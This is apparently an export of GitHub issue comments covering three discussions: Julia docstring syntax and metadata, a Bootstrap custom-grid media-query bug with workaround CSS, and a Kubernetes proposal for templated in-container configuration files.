julia/JuliaLang/8514/57306583,"Key problems with this approach  As discussed elsewhere (e.g. MichaelHatherly/Docile.jl#29), there is no need for documentation objects to be a string; they can be any Julia object with the appropriate  methods.   e.g. imagine a documentation object like .  A  keyword allows more generality here.   Docile currently allows additional metadata to be stored in the documentation, e.g.  Docile currently allows  vs.  in order to distinguish documentation for a  in general vs. documentation for a .  One possibility would be to make the  keyword optional for string literals (including string macros like ), but to allow it for more complicated documentation. ",,False,False,8514
julia/JuliaLang/8514/57312394,"Documentation specific to argument signature is definitely better than concatenation, plus one for documentation being anything with a  method. A transformation like would also let us evaluate documentation objects only when they are needed. e.g.  could call the closure and cache the result. ",,False,False,8514
julia/JuliaLang/8514/57322628,"I know that this is probably not a popular opinion but I really think we should consider using Restructured Text at least for the default markup in Base.   It supports everything we will want (inline math / code, cross-links, tables, etc.), supports extensions in the standard for functionality we would want to add, and would allow us to reuse all the tooling in developed in the Python world (Sphinx, ReadTheDocs, etc.) which imo is the best out there. Otherwise I see us developing yet another superset of Markdown to support our needs which may or may not be consumable by other tools.  I guess if we pick a superset with better tooling support (such as PanDoc markdown with all the extensions) we might be able to mitigate this problem. ",,False,False,8514
julia/JuliaLang/8514/57324678,"These are good points. Having an API for this is key, as that will allow even more flexibility than a keyword. For fancy documentation needs, use the API instead of the special syntax. It's probably also true that we'll want to associate docs with particular type signatures. I think associating arbitrary metadata with every docstring is overengineering at this point. Where we are, we can't even ask for help for a simple function in a package. ",,False,False,8514
julia/JuliaLang/8514/57324811,"ReStructured Text is awful. I wrote most of the original manual and writing it in Markdown was a pleasure. Writing documentation has been a painful chore ever since we switched from Markdown to RST. Having complicated formatting types for documentation is overkill and something that we can consider, if at all, only if there's strong evidence of a real need in practice. I don't think there will be any such need. There should be essentially no choice about documentation – the worst possible situation is one where everyone writes docs in their personal favorite format and there are a dozen of them. There should be one reasonable way to write docs that works well and that everyone is familiar with. What we generate during parsing should be simple and easy for the parser to construct – i.e. just strings – and these strings should look decent if you just show them as is. Markdown fits the bill perfectly – it is already (by design) how people intuitively markup plain text content. ",,False,False,8514
julia/JuliaLang/8514/57324828,"@friend, as I've discussed in the abovementioned Docile issue, the plan for typical documentation objects (e.g. Markdown text) is to store only the unparsed string when the file is loaded.  Parsing of the AST, generation of HTML, etcetera, is only performed ""lazily"" when the help is requested in some format. @friend, the choice of format is orthogonal to this feature if my suggestion is adopted.   Markdown documentation would be  (creating a  object), Restructured Text would be  (creating a  object), etc.  Each would have appropriate  methods to generate text/html, text/latex, or whatever.   We can argue about what format should be used in Base elsewhere. ",,False,False,8514
julia/JuliaLang/8514/57325174,"@friend, we absolutely have to have some kind of metadata if you want to have any possibility of generating offline documentation, because you can't just have a long list of 3000 functions in Base, sorted alphabetically.  At the very least, you have to be able to mark what section and subsection of the manual they should appear in. ",,False,False,8514
julia/JuliaLang/8514/57325366,Let's cross that bridge when we get there. ,,False,False,8514
julia/JuliaLang/8514/57325472,"@friend, the antecedent of ""that"" in your comment is unclear. ",,False,False,8514
julia/JuliaLang/8514/57326128,"I meant the issue of generating offline documentation. Alphabetical listings of documentation with a hierarchy implied by modules is what Java uses, and while that's not amazing, it does work. Indicating how to structure the presentation of docstrings seems like something that could easily be done by providing an external outline that references the objects to be documented in the desired organization. ",,False,False,8514
julia/JuliaLang/8514/57327069,"We already have our functions well separated in modules and if this forces us to do some more refactoring, that is not necessarily bad. ",,False,False,8514
julia/JuliaLang/8514/57327321,"@friend, we are ""there"" if we want to use this in Base, replacing our current RST documentation, because we need an offline manual.   It would be shortsighted to implement a feature that doesn't satisfy our own immediate needs! Hierarchies implied only be modules seem unacceptable to me, because most Julia modules have more functions than you would just want to list alphabetically ... our methods aren't nicely sorted into big class hierarchies like in Java, so the Java experience isn't a good analogue here. @friend, do you really want to separate Base into zillions of submodules?  Anything more than a dozen or so methods I would want to start grouping into subsections in a decent manual, and that would correspond to 100+ modules. ",,False,False,8514
julia/JuliaLang/8514/57327766,@friend if it is so awful why did you switch?  I'm assuming you wanted to use the tooling which is kind of case in point. ,,False,False,8514
julia/JuliaLang/8514/57329708,"Regarding redefining functions &amp; concatenating strings, the way Docile does it (and the way I originally proposed) is that the documentation ( or whatever) is keyed by the  for the generic documentation, and by  for method-specific documentation, and in each case stores arbitrary objects.   Asking for  would normally give you the generic documentation followed by a list of method-specific docs for .  This way, redefining functions doesn't concatenate documentation. Presentation systems (e.g.  or offline docs) have more flexibility in how they order things.  e.g. they don't have to sort methods by the order they happened to be defined in, but can instead sort them by their type signatures or whatever.  And they can put different methods into a bulleted list or whatever format is desired. String concatenation is not appropriate anyway if documentation is an arbitrary object, e.g.  or .  ",,False,False,8514
julia/JuliaLang/8514/57330101,"ReST was not really our choice; I believe @friend just did the work and it was a very solid improvement at the time. I would be much happier if we could fix the infamous ""extra newline"" bug. But I agree there is something to be said for a format that's already designed for this very purpose. Can anybody comment on how python or other languages deal with metadata for docstrings? I'm not 100% opposed to it, but I think it is necessarily an extension of a simpler feature. For example, we are likely to support anyway; metadata involves further decorations of that syntax that can be optional. ",,False,False,8514
julia/JuliaLang/8514/57330755,"@friend Honestly, I didn't want to switch, but someone (@friend, iirc) has already done the work and it was an improvement, so we just went with it. Read the docs is nice, but I still hate RST and I'm not that thrilled with the rest of the tooling around RST (random newlines anyone?). If we choose RST as a format, we're stuck with it. If we choose a format we like, we can build all the tooling we need. ",,False,False,8514
julia/JuliaLang/8514/57330881,"I'm confused about how the void string idea is going to work in the REPL. If I type a string into the REPL, then hit enter, what happens? ",,False,False,8514
julia/JuliaLang/8514/57331007,@friend Nothing – it has to be a string in void context followed by something that it can be attached to in the same input. ,,False,False,8514
julia/JuliaLang/8514/57331261,"So it will matter whether I execute string + code at two prompts or string at prompt, then code at prompt? ",,False,False,8514
julia/JuliaLang/8514/57331635,Isn't metadata something that can be handled within the docstring? Pandoc and Jekyll for example both support YAML front matter in markdown docs to attach arbitrary metadata. We also already have pure Julia Markdown and YAML parsers. ,,False,False,8514
julia/JuliaLang/8514/57331690,"The lack of structured information in Python has been a longstanding problem, as I understand it. Syntax-wise, I would suggest something like the following That is, you would use the  keyword for anything more complex than a string literal (or string macro).  e.g. for generic documentation objects (not strings), or to provide metadata (a Dict of some kind) which could be a variable as in the last example (to share metadata for several related functions). ",,False,False,8514
julia/JuliaLang/8514/57331801,plus one to metadata inside the doc string. ,,False,False,8514
julia/JuliaLang/8514/57331998,Do you anticipate entering a lot of doc strings at the prompt? ,,False,False,8514
julia/JuliaLang/8514/57332014,Metadata inside the docstring implies that construction cannot happen lazily as you would have to parse all docstrings (or eval if they are objects) before you could properly organize them. ,,False,False,8514
julia/JuliaLang/8514/57332209,"Problems with putting the metadata inside the docstring  It requires us to have ""Julia-flavored"" markdown (or whatever) with our own magic metadata markers. It requires us to specify a docstring format, rather than separating format from metadata, and relying on  to convert arbitrary objects to output formats. It makes it hard to share metadata ... e.g. you will often have several methods with the same metadata (e.g. they are all in the section ""Mathematical functions"" and the subsection ""Special functions"" as in my example above), and it would be a lot nicer to not have to retype this in each docstring.  ",,False,False,8514
julia/JuliaLang/8514/57332306,Package loading is already a performance problem – constructing lots of dicts during parsing is going to make it way worse. ,,False,False,8514
julia/JuliaLang/8514/57332587,Metadata could be a list of pairs  and then the overhead would be smaller. ,,False,False,8514
julia/JuliaLang/8514/57332668,I have zero problem with there being a Julia-flavored markdown format. I suspect it is inevitable. We should try to make sure that it matches the IJulia-flavored markdown as much as possible. ,,False,False,8514
julia/JuliaLang/8514/57332952,"YAML has a standard document begin/end markers. I don't see a standardized docstring format as a bad thing. YAML supports references. So you could write the full metadata once, tag it, then reference it in other docstrings. ",,False,False,8514
julia/JuliaLang/8514/57333590,"I think that having the organization of how doc strings are presented be external to the code and docs is a better approach. I.e. you have an outline where you refer to entities that have doc strings and a tool that weaves this together into HTML pages that can go online. Trying to cram all of the information needed to weave individual doc strings into a coherent final document just isn't going to work well. The doc strings provide bits of content that can be either consumed individually from the REPL or reused when putting together complete documentation. Putting all the organization and metadata into the doc strings is like a worse version of literate programming, which itself hasn't panned out that well. ",,False,False,8514
julia/JuliaLang/8514/57333756,"@friend, I just did a little benchmark.  ing a file defining 10,000 random string constants took 1.47 seconds, while ing a file defining 10,000 random  dictionaries took 3.16 seconds.  This difference doesn't seem that substantial to me, especially since most modules will define much less metadata than this. ",,False,False,8514
julia/JuliaLang/8514/57334017,2x slower is huge considering the the massive amount of work you have to go through to make the frontend 2x faster. ,,False,False,8514
julia/JuliaLang/8514/57334121,"@friend, losing a factor of 2 in something that only takes 1% of the total loading time for a module means losing a factor of 1%. That being said, having to put a separate placeholder in an offline ""manual outline"" for each function that you want to appear there does not seem terrible to me. ",,False,False,8514
julia/JuliaLang/8514/57334213,"Good documentation combines introductory and transitional material with bits of reference. An outline document is a good place for the introductory and transitional material, and it can simply splice in doc strings in the appropriate places. That way the details remain up-to-date and near the definitions of the functions being described, while the code isn't cluttered with lots of prose, and it isn't forced to be concerned with the structure of the documentation, which often doesn't match the structure of the code. ",,False,False,8514
julia/JuliaLang/8514/57335256,"So basically, I'm proposing this for the overall documentation  doc strings provide bits of markdown-flavored reference material associated with specific objects and symbols there is no structure and no metadata for doc strings beyond this – they can be queried and displayed in the REPL or in other interfaces like IJulia and Juno, but they're just organized like a key-value store. high-level documentation is written in the same markdown-flavored format, but it can easily splice in bits of doc string so that the material stays in sync and doesn't have to be repeated.  ",,False,False,8514
julia/JuliaLang/8514/57336677,"I don't understand how you'd ""easily"" plug in doc strings. It seems easier indicate sections next to the methods; how do I indicate which function/method I want to plug in, in the outline-thing? (vs. writing the outline/intro material and then plugging in the whole section of docstrings at once.) On Tue, Sep 30, 2014 at 1048 AM, Stefan Karpinski &lt;notifications@friend.com ",,False,False,8514
julia/JuliaLang/8514/57338017,"Totally on board for 1 and 3. I would still prefer to support in-docstring metadata, but I see it as non-essential, and could easily be added later. One issue with splicing in docstrings is that adding a new method necessitates changing the documentation in two places (docstring, and external docs). Whereas metadata would allow defining groups of docstrings to splice in together. I could imagine using a template system like mustache. So external docs would look like ",,False,False,8514
julia/JuliaLang/8514/57339587,"Yes, just what @friend said. I think some amount of metadata in doc strings makes sense – just enough so that you can query them by keywords or something. That could easily be satisfied by having a convention that writing  at the bottom of a doc string allows the string to be retrieved by keyword queries. Making this mechanism fully programmable strikes me as asking for abuse and overcomplication. ",,False,False,8514
julia/JuliaLang/8514/57339897,"Does  mean the function-level documentation or all documentation? What if I only want one method of ? On Tue, Sep 30, 2014 at 1116 AM, Stefan Karpinski &lt;notifications@friend.com ",,False,False,8514
julia/JuliaLang/8514/57350291,"I can tolerate omitting generic metadata, but I would strongly prefer using custom string (or other object) types to indicate format, with  for output.  Writing  instead of  is only two extra characters, which is a small price to pay for not locking ourselves into Markdown for the next 20 years. We'll want a string macro anyway, so that we don't need to escape  or  in code samples or LaTeX equations.  LaTeX equations are basically unusable without a string macro to suppress escaping.  Base can ship with only  () (and also text/plain strings, of course), which will serve the purpose of encouraging everyone to use the same format. ",,False,False,8514
julia/JuliaLang/8514/57351715,"(Though as soon as you start thinking about adding custom markdown extensions like keywords, I think the issue of metadata should be revisited.  If you think that creating metadata dicts will slow down loading, wait until you actually try parsing the docstrings at load time.   If you separate the metadata and the docstrings, each docstring need only be parsed when it is displayed.   Dicts are  way more flexible, will arguably be easier to implement because they use the existing parser, and don't require custom markup flavors.) ",,False,False,8514
julia/JuliaLang/8514/57364343,"I am extremely hawkish about load time but I'm not really worried about the slowdown from metadata dicts on docstrings, for reasons that have been discussed already (1) they're not all that slow, (2) not all docstrings will have them, (3) they can be shared among docstrings. My main concern is getting something simple working first so we can have help and docs for packages ASAP. After that there are concerns about complexity and where various information should be stored, but we can continue to discuss that while enjoying the availability of package help ) ",,False,False,8514
julia/JuliaLang/8514/57365866,plus one to having something that works for packages asap. ,,False,False,8514
julia/JuliaLang/8514/57368284,"Yes, plus one to having something vaguely like what's been discussed in this thread soon. I'm happy to adjust Docile to match whatever makes it into Base so that 0.3 packages can have documentation too. ",,False,False,8514
julia/JuliaLang/8514/57378024,"I agree that we should get something asap, with the caveat that major flaws and disagreements should be things that are resolvable later without much breakage. Adding documentation metadata is something that can be done later without breakage, because most docstrings won't have metadata so we will want an optional syntax anyway. Changing  to  if you want markdown-syntax docstrings will be a painful breakage to impose later. ",,False,False,8514
julia/JuliaLang/8514/57385994,"Regarding the  vs  change, if the default is markdown, then changing later is a matter of making markdown the default and allowing other formats optionally. It strikes me as weird to indicate the flavor of markup on a per-doc-string basis. Are you going to use lots of different markups in a single file or even a single project? I'm really not convinced that we'll ever need more than one. ",,False,False,8514
julia/JuliaLang/8514/57393740,"@friend, note that we'll need a string macro anyway in order to easily use LaTeX equations in Markdown (otherwise you have to backslash like crazy). ",,False,False,8514
julia/JuliaLang/8514/57394552,That would be true if we couldn't change the parser ;-) ,,False,False,8514
julia/JuliaLang/8514/57413727,"I would prefer format-agnostic documentation (requiring only writemime). I don’t think “getting something out fast” is affected by which of these we chose. Making something work for special Julia Markdown strings only vs. an equivalent MarkdownString type doesn’t seem like a big difference as far as implementation effort. Forcing everyone to use the same format seems unfortunate. I agree with having a strong default (i.e. shipping and using only one format in base), but choosing not to support any other format is actively preventing anyone from ever using a different format. There is always some dissent about formats, and if someone strongly prefers rst for their project (for the toolchain, or whatever), then there’s no reason to actively prevent them from doing so. An example of using different types of documentation in one package some documentation might be in a separate file, so those functions would just like to refer to the file path &amp; have the file actually read lazily. This could be accomplished with a different type (FileDocString or whatever) that behaves appropriately. Allowing user-defined documentation formats would also allow users to define their own extensions to Julia Markdown -- and try them out without forcing them on anyone else or needing to modify the Julia parser. ",,False,False,8514
julia/JuliaLang/8514/57418977,"FWIW I'm in violent agreement with @friend w.r.t allowing whatever system we end up with to store arbitrary metadata, not just strings. My impression is that the clojure community (e.g.) has benefited tremendously from this and built some really cool stuff (core.typed anyone?) on top of it, and it seems uncharacteristically restrictive (for what I see as the ""Julian"" attitude about this sort of thing) to not allow it. ",,False,False,8514
julia/JuliaLang/8514/57424324,What @friend said! Just learned about how Clojure does this  - very neat! IMO a good implementation would make documentation a special case of a general mechanism to attach metadata to certain kinds of objects. (at least under the hood while providing sufficient syntactic sugar.) ref #3988 ,,False,False,8514
julia/JuliaLang/8514/57426034,"which, unless I'm mistaken, is exactly what @friend has been arguing for. ",,False,False,8514
julia/JuliaLang/8514/57448674,"I like the idea of having ""..."" / """"""...""""""be Julia's default Markdown, whatever flavor that is, so we and our tools don't have to think very hard about how to deal with basic comments. I'd also like to see provision, even if just a placeholder for now, to add flexible metadata.  Although most docs right now are either plain text or rich text, there are plenty of areas where a picture or equation would really help, and with tools like IJulia and Juno we already have much of the infrastructure required to serve rich help. ",,False,False,8514
julia/JuliaLang/8514/57480894,"Note also that if we support attaching an arbitrary ""documentation"" object with output via , then including dictionaries of metadata can be implemented on top of this.  e.g. you can have a  type that wraps the ""actual"" documentation object plus a  dictionary of other metadata (Where, as I mentioned above, we probably need an optional  keyword for any documentation object that is not a string literal or string macro.) ",,False,False,8514
julia/JuliaLang/8514/57481472,"FWIW, I find @friend's suggestion really compelling. It seems much easier to make an initial pass that's very vague about what ""should"" go in a MetaDoc object and flesh it out, than to take a stricter rule about strings and later replace it with MetaDoc objects. ",,False,False,8514
julia/JuliaLang/8514/57563194,"I'll just note as a minor point that using some kind of clue, like  or  or whatever, would make things much simpler for editors' and IDE's highlighting, for properly displaying special characters, LaTeX etc., since we can't really expect editors to implement full-blown parsers. Maybe that could be mitigated by using ""a string at global scope is documentation"" as a proxy rule, but I suspect that could turn out messy. ",,False,False,8514
julia/JuliaLang/8514/57898623,"We already have a concept that for creating new syntactic elements, and they are called macros and string macros. Having different rules for  in different contexts would be inconsistent, making Julia more confusing. I'd argue that two extra letters to type for Markdown parsing isn't a big problem. If you use markdown for formatting your documentation, you'll probably have a multiline doc, and two characters seem like a small annoyance. I agree that it is poor style to mix different documentation formats in a single file, it might sometimes be useful. That way you can gradually change format in a file without having to fix all the issues at once. Usually design discussions in Julia has not been won by the argument ""someone is going to use this feature to write horrible unreadable code"". ",,False,False,8514
julia/JuliaLang/8514/57899055,"I have to disagree with this. Firstly, a lot of docstrings are likely to look like i.e. not multiline. That said, it's not really about the two character overhead. The fact is that most people will use the most the most convenient documentation form available, so defaulting to plain docstrings amounts to endorsing them. I'm all for supporting richer formats ( etc.) but supporting both plain and rich docs doesn't make much sense – markdown opens a lot of opportunities (nice presentation, syntax highlighting, structured information etc.) without making things more cumbersome, so we should encourage people to use it over plain text as much as possible. Treating  docstrings as  is a very simple and effective way to do that. ",,False,False,8514
julia/JuliaLang/8514/57904820,"This is a good idea. One of the problems with Python docstrings is that they are plain text, and you can't get people to use anything else unless it's endorsed by the language implementation. TIMTOWTDI leads to everyone using the lowest common denominator, i.e. plain text. Unambiguously going with one default markup language in Julia makes it better. Markdown is a good choice, especially as IJulia is the de facto ""more than plaintext"" display environment for Julia. ",,False,False,8514
julia/JuliaLang/8514/57909293,Putting myself in the loop to make sure Lint can check through doc string correctly. ,,False,False,8514
julia/JuliaLang/8514/57909930,"I think that rather the problem with Python docstrings is that there is no standard way of specifying the format. That means that when you aggregate documentation from docstrings, you have to guess the format, and computers are bad at guessing, so the feature is little used. @friend Maybe that is a valid case, but if I want to save characters to type I'll rather not have to repeat the signature inside the docstring, but have it automatically captured from the actual signature on the next line. ",,False,False,8514
julia/JuliaLang/8514/58513131,"By the way, another reason to support (a) plain-text strings and (b) non-literal documentation strings is importing help from other languages. e.g. in PyPlot I define various functions which are wrappers around Python functions, and I want their help to be automatically imported from the Python docstring.  If we have a  keyword (or ) that supports arbitrary Julia expressions, and allows plain-text strings, this will be easy ",,False,False,8514
julia/JuliaLang/8514/60149092,Just checking in here to see if we have something usable to start with. Are we still waiting on ? ,,False,False,8514
julia/JuliaLang/8514/60161602,"Markdown.jl is already in that other PR (which is good to go as far as I'm concerned, though I'm happy to make any changes if I've missed anything of course). ",,False,False,8514
julia/JuliaLang/8514/63051744,Oh yeah we can totally close this ,,False,False,8514
bootstrap/twbs/7745/13830296,"I was looking at the media query for (max-width 767px) in my custom bootstrap downloaded from the site, and I believe it has an error in it. I customized my bootstrap using the online customization to have 15 columns, which worked out great. Yet I believe this code is incorrect and should be referencing span15 in my case, or the largest span# in any custom bootstrap.css .span12, .row-fluid .span12 {     width 100%;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;   } Let me know if my assumption is true, as I don't immediately detect any difference in my layout by changing the 12 to 15. ",,False,False,7745
bootstrap/twbs/7745/17260531,"If you post code on github use the appropriate markdown. Link is on the top right of the comment box. I am not working with 2.0 anymore but i can confirm this code is in the generated CSS I just downloaded to to look at. This should indeed output as  based on the custom span value used. I used 16 as a custom value everything else is generated as it should be but this part is fixed to 12 is seems. If the assumption is true this means if you use  this will break your layout. Like . span15 should also not have the optimal layout but there are very few cases people use the maximum span inside a row I guess since there is not really a point, that maybe for dynamic content. But if you use spans inside rows you should definitely see changes when your switch from 12 to 15. You should now have the space of 3 spans empty at the right of your rows. ",,False,False,7745
bootstrap/twbs/7745/17261440,"I'm not sure what you're talking about with regard to proper markdown. It looks fine and readable to me...? I don't have any span 12s on my pages, but I bet you're right! I bet if I did, I'd be wondering why my layout is broken. Concerning your last paragraph, that's true. But what I'm saying is that changing .span12, .row-fluid .span12 { width 100%; -webkit-box-sizing border-box; -moz-box-sizing border-box; box-sizing border-box; } to .span15, .row-fluid .span15 { width 100%; -webkit-box-sizing border-box; -moz-box-sizing border-box; box-sizing border-box; } doesn't appear to do anything to my layout at sizes less than 767px. I don't see a difference at least. Should I? ",,False,False,7745
bootstrap/twbs/7745/17264689,Closing this out—the grid system is massively overhauled in v3 and everything does get . ,,False,False,7745
bootstrap/twbs/7745/17285845,"@friend well your code is not indented what is probably caused by just copy pasting it and its not in monospace font so you not used the markdown for it. For this short parts of code not so big deal but you should just use it when posting on github. Look I think it's a bit harsh to just close it since it is a actual bug you discovered. The bug should be easy to find and fix. But on the other hand makes sense since in 3.0 things are handled so much better. And no once the spans are not floating you should not see a difference. So you do actually see one when 768+, thats what I meant. I suggest you dig a bit into it and learn what the grid actually does. You may dig down the source of this bug on the way. Or simply not use span12 and span15 in your case and you're good. I personally would only use even numbers for the grid btw since you can't 50/50 otherwise. ",,False,False,7745
bootstrap/twbs/7745/17292488,"Thanks for the extra reply nextgenthemes! I was hoping you'd answer my question. ) For my client's website, the majority of their columns in the design I made are 3 and 5 column, and you can't do 5 centered columns in an even numbered grid that also can do 3 columns. You can only do 5 column in these grid column amounts 5, 10, 15, 20, and so on. You can do 3 column layouts in these column amounts 3, 6, 9, 12, 15, 18, 21. 15 was the best way for me, and the design has been working beautifully (and easily) ever since I switched to a custom 15 column grid. I'm glad the customize section of Bootstrap exists, otherwise I never would have been able to do all of the math, however, I must admit the math for the column and gutter sizes did take me a few hours of trial and error. If what I said above doesn't make sense to anybody who ends up reading this via a google search someday... The reason I used a 15 column grid is because... span5, span5, span5 = 3 column layout span 3, span 3, span 3, span 3, span 3 = 5 column layout What nextgenthemes says about not being able to do 50/50 using supplied CSS classes is true, however that is extremely easy to write custom CSS for. In fact, I am using custom CSS to do exactly that for something that I want to go from span5, span10 to 50/50 on screen sizes smaller than 767px (by default all spans collapse into 1 column at this size). Maybe this will help someone some day, so I'll go through the process. What I did was replace my span5 and span10 with spain5nocollapse and spain10nocollapse in the HTML file, then put this code into my custom CSS. /note you'll need to open your bootstrap-responsive or custom bootstrap.css and find the appropriate percentages for your site/ .row-fluid .spain10nocollapse {     width 65.29284164859001%; /see note above/     width 65.23861171366593%; /see note above/     float left;     display block;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;     min-height 30px;     margin-left 0px } .row-fluid .spain5nocollapse {     width 30.585683297180044%; /see note above/     width 30.531453362255967%; /see note above/     float left;     display block;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;     min-height 30px;     margin-left 0px } @friend (max-width 767px) { .row-fluid .spain10nocollapse {     width 50%;     width 50%;     float left;     display block;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;     min-height 30px;     margin-left 0px } .row-fluid .spain5nocollapse {     width 50%;     width 50%;     float left;     display block;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;     min-height 30px;     margin-left 0px } } There's probably some extraneous code in there that isn't necessary, but I haven't gotten to the stage of my programming where I care about cleaning up redundancy. Hope that helps someone in the future. BTW, the reason I am using ""spain"" instead of ""span"" is because I didn't want any CSS that affects all classes with the name ""span"" to mess with these styles. ",,False,False,7745
bootstrap/twbs/7745/17292680,"The format for two of those lines of code is wrong. They are supposed to be *width Guess I should have tried harder to find the way to input code on here, but I don't see any way of doing it... ",,False,False,7745
bootstrap/twbs/7745/17347363,Even after I told you you post huge chunks of code without proper formatting. Anyway this was about your bug report and I confirmed that bug! The issue is closed and this is not the place to get help for your personal stuff. Try stackoverflow or the BS IRC channel. ,,False,False,7745
bootstrap/twbs/7745/17491512,"Thanks nextgenthemes, I'll follow your example and be a jerk who can't read code that isn't inserted in an inset gray box and post rude comments when someone tries to help others. Or maybe I should say it like this so you're unable to read it. .nextgenthemes { display jerk; readability none; response-mode uncalled-for; } ",,False,False,7745
bootstrap/twbs/7745/17587088,"Keep the name-calling and attitude out of our issues, please. Folks are here to learn, get help, and report bugs. They're not here to see folks bicker among themselves—that doesn't help anyone. @friend He's referring to the ""GitHub Flavored Markdown"" link directly above the comment field on the right. Click that and it will show you how to use Markdown so you can take advantage of code syntax highlighting. Alternatively, have a look here. @friend I appreciate you trying to help, but please do your best to avoid the attitude in the future. You may not have even meant it, but I hope you can see how easy it is for folks to take it one way or the other. It's tough communicating via text like this—tone and context are easy to miss. ",,False,False,7745
kubernetes/kubernetes/30716/171535837,"Summary I would like us to get rid of custom entrypoint.sh scripts by supporting templating of in-container files. The Problem Despite current ConfigMap features, it remains necessary for many or most container images under Kubernetes to include ""entrypoint.sh"" scripts and/or customizations to the containerized applications which are particular to the Kubernetes environment.  This results in forking of upstream images and limits portability of images between environments.  It also results in some very hackish startup scripts (see Kelsey's ""init scripts for hipsters""). Based on feedback through numerous issues and PRs, the main shortcoming in ConfigMap which would allow elimination of entrypoint scripts is the inability to include elements into a configuration file which are only available at deployment time.  For example, some services, such as clustered databases or load balancers, need to know the Pod IP or the pod name as part of their configuration. Suggested Solution ConfigTemplate Several proposals have been made to enhance ConfigMaps to embrace templating functionality, and they have met with significant opposition. My proposal is that we create a new object ... named here a ""ConfigTemplate"" as placeholder until someone suggests a better one.  This Template object would produce a file inside the deployed container, and could consume the Downward API, Secrets, and ConfigMaps in order to populate a template.  This would be largely the same as PR #30502, but with a new object type instead of overloading ConfigMaps. At a sketch, a ConfigTemplate for an ini-style config file could be inlined, and might look like this Note what syntax we use for the exact substitutions is unimportant; let's just use whatever is easiest to support/code. For inline versions, it is likely that only key $value substitutions would be supported.  For more complex behavior, including differently-formatted configuration files, we'd support file-based substitution, ala The file in question would be some kind of text file, with substitution tags in whatever syntax we decide on.  Either way, the ConfigTemplate would then be used inside Pod definitions like this Why not volumes? You'll notice above that I'm not taking a regular ""volume"" approach to this. That's because in many cases ... including some cases I have personally ... the rendered config file needs to share directories with files which come from the container image.  Doing this in a volume is complicated, and will lead (again) to custom entrypoint.sh scripts. However, if there are strong reasons to handle this as a volume, that could be worked around. Templating Engines and Sidecars There is some discussion about how templating would be handled and what templating engine we'd use.  This includes a suggestion by @friend that this be entirely sidecar functionality. I will argue that providing config file templates which allow containers to start inside Kubernetes pods without modification is fairly central functionality to what Kubernetes does, and as such the general Template object should be a core Kubernetes object.  However, I can certainly see the value of allowing the user to plug in their choice of rendering library for the actual template rendering for file-based templates; if nothing else, it would forestall a lot of arguments about syntax. Even in that case, however, I would like us to provide a built-in very simple template renderer, one which is capable of just swapping in upstream facts for some specific variable syntax, such as ${fact} or {{fact}} or similar, and nothing else.  Such a built-in renderer would satisfy 90% of users, and not push the user into installing extra dependencies. Alternatives I cannot personally think of any alternatives which will lead to the elimination of the majority of entrypoint.sh scripts.  Suggestions welcome. References  PR #30502 Issue #29607 Issue #28560  ",,False,False,30716
kubernetes/kubernetes/30716/240292538,cc @friend @friend @friend @friend @friend @friend/rh-cluster-infra ,,False,False,30716
kubernetes/kubernetes/30716/240341499,"How far can you get using an init-container? For example init-container consumes data from a configmap, substitutes values, and writes the resulting complete config file to a a path in an EmptyDir.  The main container reads the config file generated by the init container. ",,False,False,30716
kubernetes/kubernetes/30716/240375767,"@friend I've tried to address init-container suggestion in a separate thread, it works for initial configuration. In the future, If we want to allow proper config change handling, it would be better to have it natively supported by Kubernetes ecosystem. ",,False,False,30716
kubernetes/kubernetes/30716/240512944,"@friend two comments on init containers  we'd need to automate that process via some kind of Kubernetes object; otherwise it would be just a case of moving the burden on container image authors without decreasing it (in fact, we'd be increasing it).  If Template works via an init container under the hood, that's fine with me.  See my note above about the issues with volumes and config files.  In many cases, you want to only update 1 config file in a directory which may have several of them, such as for Postgres or Apache HTTPD or network-config.  Currently AFAIK there's no way to ""share"" a volume directory between files supplied by the image and files from the volume.  That would put users in the position of needing to re-create all of those config files, even if most of them are identical to the ones in the upstream image.  Which would then lead to out-of-sync issues if fixes are added to the config files in the upstream image.  Possibly merging the directories could be handled by the init container?  That is, it would pull files from the template, and the rest from the upstream image?  That would solve that issue, at least.   ",,False,False,30716
kubernetes/kubernetes/30716/240523424,"Image volumes have been requested - in the future that would address #2 as well.  In the short term we've said use an init container to handle that. On Wed, Aug 17, 2016 at 300 PM, Josh Berkus notifications@friend.com wrote ",,False,False,30716
kubernetes/kubernetes/30716/240523972,"Devils advocate - why can't you provide a custom Command to the container and apply the transformation in that container?  The entrypoint would then be in the pod definition, not the image.  While I'm sympathetic to templated config map, you can already templatize in Command and Args (IIRC), so this is already possible. ",,False,False,30716
kubernetes/kubernetes/30716/240524863,"Would be If config map was a valid target for env valueFrom (which it should be, because of secrets), then this should allow you to at least craft templates without changing the image. ",,False,False,30716
kubernetes/kubernetes/30716/240530225,"That strikes me as unsatisfying for a number of reasons First, it means sharing the configuration is harder -- with a ConfigTemplate, you can just say , and mount as a volume (and edit the template when necessary).  With this approach, you have to say ""go in to your pod, convert the entrypoint back into a single string, then put your environment file in a HEREDOC with cat, and the append the existing entrypoint, and hope you didn't screw anything up in there with quoting, because your entrypoint is now a big string blob instead of an array of arguments"". Secondly, it makes sharing the config harder -- you can just share the config template as standalone object, you have to share it as part of the pod spec, and then the receiver has to extract the relevant parts from the pod spec. Also, it makes the entrypoint on an image much harder to read -- you go from just having a command to having a chain of commands that do  and  and , and then launch the actual image.  That seems easy to mistype and misread. ",,False,False,30716
kubernetes/kubernetes/30716/240538955,"Templates of config are pretty closely coupled to pods.  You can always put the template in the config and combine them in the pod. The entrypoint is under the control of the pod author.  If the pod author doesn't control the image, they can control the entrypoint via the pod definition.  I'm fairly sure that we can provide an idiomatic representation of config templating in the pod template, which does allow references to other resources.  I am very skeptical of configmaps that point to other configmaps, so it's a much harder argument to say that we want to support references between a config map and another resource AND support references between pods and config maps. ",,False,False,30716
kubernetes/kubernetes/30716/240540721,"Generally our answer to this has been - ""init containers"".  Given that gives you access to a turing complete space, and everything we provide in a config map can be transformed, you can use any templating language you want, combine any config map you want, and control it all, without any changes to kubernetes.  The alternative - implement  - requires us to bless a templating language and implement additional code.  Why is ~200 chars of init container definition in the pod worse than ~200 chars of a configtemplate definition? ",,False,False,30716
